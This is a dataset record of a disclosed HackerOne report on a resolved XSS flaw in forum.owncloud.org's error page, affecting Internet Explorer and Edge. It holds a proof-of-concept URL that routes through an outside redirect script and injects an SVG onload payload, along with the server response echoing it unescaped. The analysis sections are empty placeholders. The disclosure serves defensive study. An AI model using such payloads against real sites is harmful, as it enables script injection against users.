---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '154319'
original_report_id: '154319'
title: '[forum.owncloud.org] IE, Edge XSS via Request-URI'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: owncloud
created_at: '2016-07-27T11:33:30.636Z'
disclosed_at: '2016-08-30T16:26:03.368Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [forum.owncloud.org] IE, Edge XSS via Request-URI

## Metadata

- HackerOne Report ID: 154319
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: owncloud
- Disclosed At: 2016-08-30T16:26:03.368Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**PoC** (Internet Explorer, Edge):
```
https://blackfan.ru/x?r=https://forum.owncloud.org/<svg/onload=alert(document.domain)>/%252e%252e
```
blackfan.ru/x?r - simple redirection script, that necessary for exploitation


**HTTP Response**:
```html
<div class="panel" id="message">
	<div class="inner">
	<h2 class="message-title">Information</h2>
	<p>No route found for "GET /<svg/onload=alert(document.domain)>/%2e%2e"</p>
		</div>
</div>
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
